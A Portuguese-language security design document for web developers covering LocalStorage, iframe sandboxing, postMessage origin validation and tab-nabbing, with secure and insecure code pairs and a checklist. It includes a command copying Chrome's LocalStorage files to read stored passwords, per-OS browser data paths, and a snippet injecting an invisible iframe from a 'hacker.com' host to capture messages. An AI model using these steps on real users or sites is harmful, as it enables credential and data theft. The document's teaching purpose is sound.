# SOFTWARE DESIGN DOCUMENT (SDD)

## Segurança HTML5 — LocalStorage, iFrames, WebMessaging e Pop-ups

| Campo                | Valor                                                        |
|----------------------|--------------------------------------------------------------|
| **Título**           | Segurança HTML5: LocalStorage, iFrames, WebMessaging e Pop-ups |
| **Versão**           | 1.0                                                          |
| **Data**             | 2026-04-08                                                   |
| **Classificação**    | Confidencial                                                 |
| **Autor**            | Baseado no curso "Segurança Para Devs"                       |

---

## 1. Introdução

### 1.1 Propósito

Este documento descreve o design de segurança para funcionalidades nativas do HTML5 que frequentemente introduzem vulnerabilidades em aplicações web. Abrange armazenamento local (LocalStorage, SessionStorage, IndexedDB), inclusão e sandbox de iFrames, comunicação entre janelas via WebMessaging API, e proteção contra tab-nabbing em pop-ups.

### 1.2 Escopo

- Riscos e regras para armazenamento de dados sensíveis no navegador
- Segurança de iFrames: sandbox, CSP frame-ancestors
- WebMessaging: validação de origem, prevenção contra injeção de código
- Proteção contra tab-nabbing via `noopener`
- Comunicação segura entre janelas e iframes

### 1.3 Definições e Acrônimos

| Termo          | Definição                                                        |
|----------------|------------------------------------------------------------------|
| **SRI**        | Sub-Resource Integrity                                            |
| **CSP**        | Content Security Policy                                            |
| **Sandbox**    | Atributo HTML que restringe capacidades de iframe/pop-up         |
| **WebMessaging**| API HTML5 para comunicação entre janelas/iframes (postMessage)    |
| **Tab-nabbing**| Ataque que usa `window.opener` para acessar a janela originadora   |
| **LevelDB**    | Banco de dados embutido usado pelo Chrome para LocalStorage       |
| **IndexedDB**   | Banco de dados NoSQL dentro do navegador                           |

---

## 2. Visão Geral de Arquitetura

### 2.1 Modelos de Armazenamento no Navegador

```
┌──────────────────────────────────────────────────────────────────┐
│          ARMAZENAMENTO LOCAL NO NAVEGADOR                       │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  LocalStorage                                              │    │
│  │  • Persistente (sobrevive ao fechamento do navegador)    │    │
│  │  • Sem expiração automática                                 │    │
│  │  • Por domínio (origem)                                   │    │
│  │  • ARMAZENADO DESENCRYPTOGRAFADO NO DISCO                  │    │
│  │  • Máximo ~5-10 MB                                        │    │
│  └────────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  SessionStorage                                            │    │
│  │  • Por sessão de aba (perde ao fechar todas as abas)     │    │
│  │  • Compartilhado entre aba principal e abas filhas       │    │
│  │  • ARMAZENADO DESENCRYPTOGRAFADO NO DISCO                  │    │
│  │  • Máximo ~5-10 MB                                        │    │
│  └────────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐    │
│  │  IndexedDB                                                 │    │
│  │  • Banco de dados NoSQL completo                           │    │
│  │  • Persistente (sobrevive ao fechamento do navegador)     │    │
│  │  • ARMAZENADO DESENCRYPTOGRAFADO NO DISCO                  │    │
│  │  • Sem limite rígido de tamanho                            │    │
│  └────────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ⚠️  NENHUM destes mecanismos criptografa os dados           │
│  ⚠️  Diferente do gerenciador de senhas (Keychain/Keystore)   │
└──────────────────────────────────────────────────────────────────┘
```

### 2.2 Arquitetura de Comunicação entre Janelas (WebMessaging)

```
┌──────────────────────────────────────────────────────────────────┐
│              WEBMESSAGING — COMUNICAÇÃO SEGURA                    │
│                                                                  │
│  Janela Pai (meusite.com)                                      │
│  ┌──────────────────────────────────────────────────┐            │
│  │  iframe.contentWindow.postMessage(                    │            │
│  │    mensagem,                                        │            │
│  │    "https://chat.meusite.com"  ← destino          │            │
│  │  )                                                  │            │
│  │                                                    │            │
│  │  window.addEventListener("message", (event) => {      │            │
│  │    if (!ORIGENS_VALIDAS.includes(event.origin))     │            │
│  │      return; // REJEITAR                          │            │
│  │    if (!MESSAGENS_VALIDAS.includes(event.data))    │            │
│  │      return; // REJEITAR                          │            │
│  │    executarAcao(event.data);                       │            │
│  │  });                                                │            │
│  └──────────────────────────────────────────────────┘            │
│       │                                        ▲                       │
│       │    postMessage                         │  message event       │
│       │    (com origin destino)                │  (com origin remetente)│
│       ▼                                        │                       │
│  ┌──────────────────────────────────────────────────┐            │
│  │  iframe (chat.meusite.com)                          │            │
│  │                                                    │            │
│  │  window.addEventListener("message", (event) => {      │            │
│  │    if (!ORIGENS_VALIDAS.includes(event.origin))     │            │
│  │      return; // REJEITAR                          │            │
│  │    // Processar mensagem                           │            │
│  │  });                                                │            │
│  │                                                    │            │
│  │  window.parent.postMessage(                           │            │
│  │    resposta,                                        │            │
│  │    "https://meusite.com"  ← destino               │            │
│  │  )                                                  │            │
│  └──────────────────────────────────────────────────┘            │
└──────────────────────────────────────────────────────────────────┘
```

---

## 3. Design de Componentes

### 3.1 Componente 1: Armazenamento Local (LocalStorage, SessionStorage, IndexedDB)

#### 3.1.1 Requisitos

| ID       | Requisito                                                                           | Prioridade |
|----------|-------------------------------------------------------------------------------------|------------|
| LS-01    | NUNCA armazenar dados sensíveis (senhas, tokens, dados pessoais) no LocalStorage    | Alta       |
| LS-02    | NUNCA armazenar dados sensíveis no SessionStorage                                      | Alta       |
| LS-03    | NUNCA armazenar dados sensíveis no IndexedDB                                            | Alta       |
| LS-04    | Armazenar apenas dados não sensíveis que facilitam a UX (preferências, tema, etc.)     | Alta       |
| LS-05    | Dados armazenados são acessíveis por qualquer processo do mesmo usuário no sistema    | Alta       |

#### 3.1.2 O Problema: Dados Descriptografados no Disco

**Comparação: Gerenciador de Senhas vs. LocalStorage**

| Característica            | Gerenciador de Senhas (Chrome)       | LocalStorage / IndexedDB              |
|---------------------------|--------------------------------------|--------------------------------------|
| Criptografia              | Sim (Keychain/Keystore/DPAPI)      | **NÃO**                              |
| Proteção em disco         | Dados criptografados                 | **Dados em texto puro**              |
| Acesso por outro usuário   | Requer senha/sessão do SO          | **Basta copiar o arquivo**          |
| Acesso por ladrão do notebook| Não consegue ler senhas           | **Consegue ler todo o LocalStorage** |
| Storage físico             | Keychain (macOS), Keystore (Linux), DPAPI (Windows) | Arquivos LevelDB (Chrome)    |

**Prova de conceito — Acesso ao LocalStorage do Chrome:**

```
# Qualquer usuário com acesso ao filesystem pode ler:
cp -r ~/.config/google-chrome/Default/Local\ Storage/LevelDB/ /tmp/leveldb_copy

# Usar leitor de LevelDB para acessar:
# Os dados aparecem em texto puro, sem criptografia

# Exemplo encontrado no arquivo:
# Key: http://127.0.0.1:8080\x01password
# Value: MinhaSenhaSecreta123!
```

#### 3.1.3 O que Pode e o que NÃO Pode Ir para o LocalStorage

| Pode Armazenar (Baixo Risco)                             | NÃO Pode Armazenar (Alto Risco)                          |
|-----------------------------------------------------------|------------------------------------------------------------|
| Preferências de tema (dark/light)                           | Senhas                                                     |
| Idioma preferido                                         | Tokens de autenticação (JWT, OAuth)                       |
| Layout preferido                                         | Chaves de API                                               |
| Última página visitada                                   | Dados pessoais (CPF, RG, endereço)                        |
| Estado de filtros/ordenação                               | Número de cartão de crédito                               |
| Dados de cache não sensíveis                              | Informações financeiras                                    |
| Flags de feature toggle                                  | Nome da mãe, data de nascimento, documentos               |
|                                                           | Dados de saúde, dados LGPD-sensiveis                      |

> **Regra de ouro:** Se o vazamento do dado causar problema de segurança ou LGPD, ele NÃO vai para o LocalStorage.

---

### 3.2 Componente 2: iFrame Sandbox

#### 3.2.1 Requisitos

| ID       | Requisito                                                          | Prioridade |
|----------|--------------------------------------------------------------------|------------|
| IFR-01   | Usar atributo `sandbox` em iframes que carregam conteúdo não confiável | Alta       |
| IFR-02   | Não usar `sandbox` sem restrições (sem valores vazios)           | Alta       |
| IFR-03   | Habilitar apenas as permissões estritamente necessárias            | Alta       |
| IFR-04   | Combinar sandbox com CSP `frame-ancestors` quando possível         | Média      |

#### 3.2.2 Comportamento do Atributo `sandbox`

**`sandbox` sem valor (ou vazio):**

Bloqueia TUDO por padrão:

| Capacidade Bloqueada                              |
|--------------------------------------------------|
| Execução de JavaScript                          |
| Envio de formulários                              |
| Abertura de pop-ups                               |
| Navegação (links, formulários)                     |
| Carregamento de plugins                            |
| Uso de pointer lock                              |
| Modificação do `window.top`                       |
| Uso do `allow-downloads`                          |
| Leitura de cookies                               |

**Permissões que podem ser habilitadas:**

| Valor                  | Efeito                                              |
|------------------------|------------------------------------------------------|
| `allow-scripts`        | Permite execução de JavaScript                        |
| `allow-forms`          | Permite envio de formulários                            |
| `allow-popups`         | Permite abertura de pop-ups                             |
| `allow-same-origin`    | Permite que o iframe seja tratado como mesma origem     |
| `allow-downloads`      | Permite downloads                                     |
| `allow-top-navigation` | Permite navegação que afete a janela pai                |

**Implementação:**

```html
<!-- Bloqueia tudo (mais seguro) -->
<iframe src="usercontent.html" sandbox></iframe>

<!-- Permite scripts mas bloqueia formulários e pop-ups -->
<iframe src="preview.html" sandbox="allow-scripts"></iframe>

<!-- Permite scripts e formulários (necessário para preview de conteúdo) -->
<iframe src="form-preview.html" sandbox="allow-scripts allow-forms"></iframe>

<!-- Permite scripts, formulários e pop-ups (menos restritivo) -->
<iframe src="widget.html" sandbox="allow-scripts allow-forms allow-popups"></iframe>
```

**Uso recomendado:**

| Cenário                                    | Atributo Sandbox                               |
|--------------------------------------------|-------------------------------------------------|
| Preview de HTML de usuário               | `sandbox="allow-scripts"`                        |
| Widget de terceiro                        | `sandbox="allow-scripts allow-forms"`            |
| Preview de documento                      | `sandbox="allow-scripts allow-same-origin"`      |
| Conteúdo completamente não confiável      | `sandbox` (vazio — bloqueia tudo)                 |
| iFrame interno (mesmo domínio)           | Não necessário (mas pode adicionar `allow-scripts`) |

---

### 3.3 Componente 3: WebMessaging (postMessage) — Comunicação Segura

#### 3.3.1 Requisitos

| ID       | Requisito                                                                           | Prioridade |
|----------|-------------------------------------------------------------------------------------|------------|
| WM-01    | Sempre especificar a origem de destino no `postMessage` (NUNCA usar `*`)   | Alta       |
| WM-02    | Sempre validar `event.origin` ao receber mensagens                              | Alta       |
| WM-03    | Validar origem com whitelist (NUNCA usar `includes()` ou `indexOf()`)        | Alta       |
| WM-04    | NUNCA usar `eval()` ou `Function()` com dados recebidos via `postMessage`     | Alta       |
| WM-05    | Validar `event.data` contra lista de mensagens conhecidas                     | Alta       |

#### 3.3.2 Os 4 Erros Fatais do WebMessaging

**Erro 1: Usar `*` como destino**

```javascript
// ❌ INSEGURO — qualquer domínio pode receber
iframe.contentWindow.postMessage(mensagem, "*");

// ✅ SEGURO — especificar origem exata
iframe.contentWindow.postMessage(mensagem, "https://chat.meusite.com");
```

**Erro 2: Não validar `event.origin` no recebimento**

```javascript
// ❌ INSEGURO — aceita mensagens de qualquer origem
window.addEventListener("message", (event) => {
    processarMensagem(event.data);
});

// ✅ SEGURO — valida origem contra whitelist
const ORIGENS_VALIDAS = [
    "https://meusite.com",
    "https://chat.meusite.com"
];

window.addEventListener("message", (event) => {
    if (!ORIGENS_VALIDAS.includes(event.origin)) return;
    processarMensagem(event.data);
});
```

**Erro 3: Usar `includes()` para validar origem**

```javascript
// ❌ INSEGURO — vulnerável a subdomínio malicioso
// evilmeusite.com.includes("meusite.com") → true!
// meusite.com.evil.com.includes("meusite.com") → true!
if (event.origin.includes("meusite.com")) { ... }

// ✅ SEGURO — whitelist com comparação exata
if (ORIGENS_VALIDAS.includes(event.origin)) { ... }

// ✅ SEGURO — regex que valida o domínio raiz
const VALID_DOMAIN_REGEX = /^https:\/\/([a-z0-9-]+\.)*meusite\.com$/;
if (VALID_DOMAIN_REGEX.test(event.origin)) { ... }
```

> **Ataque:** Um agressor que registra `meusite.com.evil.com` ou `evilmeusite.com` pode burlar a validação com `includes()`.

**Erro 4: Usar `eval()` com dados recebidos**

```javascript
// ❌ INSEGURO — executa qualquer código recebido
window.addEventListener("message", (event) => {
    eval(event.data); // Desastre!
});

// ❌ INSEGURO — Function() é equivalente a eval
window.addEventListener("message", (event) => {
    new Function(event.data)();
});

// ✅ SEGURO — validar contra lista de mensagens conhecidas
const MENSAGENS_VALIDAS = ["add", "remove", "reset"];

window.addEventListener("message", (event) => {
    if (!ORIGENS_VALIDAS.includes(event.origin)) return;
    if (!MENSAGENS_VALIDAS.includes(event.data)) return;
    acoesPermitidas[event.data]();
});
```

#### 3.3.3 Ataque: Injeção de iFrame Malicioso via WebMessaging

```
┌──────────────────────────────────────────────────────────────────┐
│       ATAQUE: IFRAME MALICIOSO VIA WEBMESSAGING                  │
│                                                                  │
│  1. Hacker cria página que inclui iframe do site-alvo            │
│                                                                  │
│  2. Via postMessage (ou script injection), hacker injeta novo     │
│     iframe DENTRO do site-alvo:                                  │
│                                                                  │
│     // Código do hacker:                                         │
│     const iframe = document.createElement("iframe");                │
│     iframe.src = "https://hacker.com/malicious-widget.html";      │
│     iframe.style.cssText = "position:absolute; width:100%;        │
│       height:100%; top:0; left:0; opacity:0";                   │
│     parentElement.insertBefore(iframe, primeiroParagrafo);        │
│                                                                  │
│  3. Agora, o código legítimo que usa querySelector("iframe")    │
│     seleciona o iframe do HACKER, não o legítimo                  │
│                                                                  │
│  4. Todas as mensagens do usuário vão para o hacker             │
│     (saldo, dados pessoais, ações, etc.)                          │
│                                                                  │
│  Defesas:                                                        │
│  ✅ Especificar destino no postMessage (não "*")                 │
│  ✅ Validar event.origin no recebimento                         │
│  ✅ Não usar eval() com dados de terceiros                       │
│  ✅ Usar CSP frame-ancestors quando possível                    │
└──────────────────────────────────────────────────────────────────┘
```

#### 3.3.4 Fluxo de Implementação Segura

```
┌──────────────────────────────────────────────────────────────────┐
│            IMPLEMENTAÇÃO SEGURA DE WEBMESSAGING                    │
│                                                                  │
│  1. ENVIAR mensagem:                                            │
│     ├── Especificar destino: origin exata                       │
│     ├── Enviar dados serializados (JSON), não código              │
│     └── postMessage(dados, "https://destino.com")               │
│                                                                  │
│  2. RECEBER mensagem:                                            │
│     ├── Validar event.origin contra whitelist                    │
│     ├── Validar event.data contra lista de mensagens válidas     │
│     ├── NUNCA usar eval/Function com event.data                   │
│     └── Executar apenas ações pré-definidas                      │
│                                                                  │
│  3. VALIDAÇÃO de origem:                                        │
│     ├── Lista de origens conhecidas (whitelist)                   │
│     ├── Comparação EXATA (não includes/indexOf)                  │
│     └── Regex que valida domínio raiz (opcional)                │
└──────────────────────────────────────────────────────────────────┘
```

---

### 3.4 Componente 4: Proteção contra Tab-nabbing

#### 3.4.1 Requisitos

| ID       | Requisito                                                           | Prioridade |
|----------|--------------------------------------------------------------------|------------|
| TN-01    | Sempre usar `noopener` ao abrir pop-ups via `window.open()`           | Alta       |
| TN-02    | Usar `noopener,noreferrer` quando não há necessidade do referer      | Média      |

#### 3.4.2 Mecanismo do Ataque

```
┌──────────────────────────────────────────────────────────────────┐
│                    ATAQUE TAB-NABBING                          │
│                                                                  │
│  1. Agressor encontra página vulnerável com script injection      │
│                                                                  │
│  2. Injeta código que abre nova aba/redireciona para site        │
│     malicioso                                                      │
│                                                                  │
│  3. A nova aba/janela carrega com:                                │
│     window.opener = janela_vulnerável                            │
│                                                                  │
│  4. Agressor pode:                                               │
│     ├── Ler window.opener.location.href                          │
│     ├── Ler variáveis e propriedades da janela original           │
│     ├── Executar JavaScript na janela original:                    │
│     │   window.opener.eval("codigo_malicioso");                  │
│     └── Redirecionar a janela original                           │
│                                                                  │
│  Prevenção:                                                      │
│  Sem opener → window.opener === null → ataque impossível         │
└──────────────────────────────────────────────────────────────────┘
```

> **Nota:** Navegadores modernos definem `opener = null` quando o usuário abre uma nova aba manualmente (Ctrl+clique ou botão direito). O risco está em `window.open()` via JavaScript.

#### 3.4.3 Implementação

```javascript
// ❌ INSEGURO — permite tab-nabbing
window.open("https://exemplo.com/pagina");

// ✅ SEGURO — bloqueia acesso via opener
window.open("https://exemplo.com/pagina", "_blank", "noopener");

// ✅ SEGURO — bloqueia opener E referer
window.open("https://exemplo.com/pagina", "_blank", "noopener,noreferrer");
```

| Atributo do terceiro parâmetro | Efeito                                            |
|-------------------------------|----------------------------------------------------|
| `noopener`                 | `window.opener` será `null`                         |
| `noreferrer`                | Header `Referer` não será enviado                  |
| `width=600,height=400`      | Define tamanho do pop-up                           |

> **Regra:** Use `noopener` em TODAS as chamadas a `window.open()`, mesmo que não haja necessidade óbvia de isolamento. Um parâmetro extra não tem custo.

---

## 4. Checklist de Segurança

### 4.1 Armazenamento Local

- [ ] Nenhum dado sensível (senha, token, dados pessoais) no LocalStorage
- [ ] Nenhum dado sensível no SessionStorage
- [ ] Nenhum dado sensível no IndexedDB
- [ ] Apenas dados não sensíveis (preferências, cache, flags) armazenados localmente

### 4.2 iFrames

- [ ] Atributo `sandbox` presente em iframes com conteúdo não confiável
- [ ] Permissões do sandbox limitadas ao estritamente necessário
- [ ] CSP `frame-ancestors` configurado quando apropriado

### 4.3 WebMessaging

- [ ] `postMessage` sempre especifica origem de destino (nunca `*`)
- [ ] `event.origin` validado contra whitelist no recebimento
- [ ] Validação de origem NÃO usa `includes()` ou `indexOf()`
- [ ] `event.data` validado contra lista de mensagens conhecidas
- [ ] `eval()` e `Function()` NUNCA usados com dados recebidos
- [ ] Dados enviados são serializados (JSON), não código executável

### 4.4 Pop-ups

- [ ] Todas as chamadas `window.open()` incluem `noopener`
- [ ] Considerar `noopener,noreferrer` quando referer não é necessário

---

## 5. Considerações de Segurança

### 5.1 Ameaças e Mitigações

| Ameaça                                        | Mitigação                                            | Ref.        |
|-----------------------------------------------|------------------------------------------------------|-------------|
| Roubo de dados do LocalStorage                  | Não armazenar dados sensíveis                          | LS-01       |
| Acesso físico ao disco lê LocalStorage      | Não armazenar dados sensíveis                          | LS-01       |
| Código malicioso em iframe                   | Atributo `sandbox` com permissões mínimas            | IFR-01/03  |
| Iframe executa JS não autorizado             | `sandbox` sem `allow-scripts`                        | IFR-02      |
| Mensagem interceptada por domínio malicioso  | Validar `event.origin` com whitelist                | WM-02/03   |
| Execução de código via postMessage           | Não usar `eval()`/`Function()`, validar `event.data`  | WM-04/05   |
| Tab-nabbing via window.opener                 | `noopener` em todas as chamadas `window.open()`      | TN-01       |
| Iframe malicioso injetado no site-alvo       | CSP `frame-ancestors` + validação de origem        | IFR-04     |
| Subdomínio malicioso burla validação         | Whitelist exata, não `includes()`                    | WM-03       |
| Acessar iframe do hacker em vez do legítimo    | Validar destino no `postMessage`                    | WM-01       |

---

## 6. Referências

### 6.1 Especificações

| Recurso                          | Descrição                                            |
|----------------------------------|------------------------------------------------------|
| WebMessaging API                 | developer.mozilla.org/en-US/docs/Web/API/Window/postMessage |
| iframe sandbox                   | developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe |
| Web Storage API                  | developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API   |
| IndexedDB                         | developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API     |
| CSP frame-ancestors               | developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors |

### 6.2 Localização dos Dados do Chrome (para forense/awareness)

| Sistema Operacional | Caminho dos Dados do LocalStorage                          |
|--------------------|--------------------------------------------------------|
| Linux              | `~/.config/google-chrome/Default/Local Storage/LevelDB/`  |
| macOS              | `~/Library/Application Support/Google/Chrome/Default/Local Storage/LevelDB/` |
| Windows            | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\LevelDB\` |

> Esses dados são armazenados em texto puro usando o formato LevelDB. Qualquer processo com acesso ao filesystem pode lê-los sem autenticação.

---

## 7. Histórico de Revisões

| Versão | Data       | Descrição                                            |
|--------|------------|------------------------------------------------------|
| 1.0    | 2026-04-08 | Versão inicial — Baseado no curso "Segurança Para Devs" |
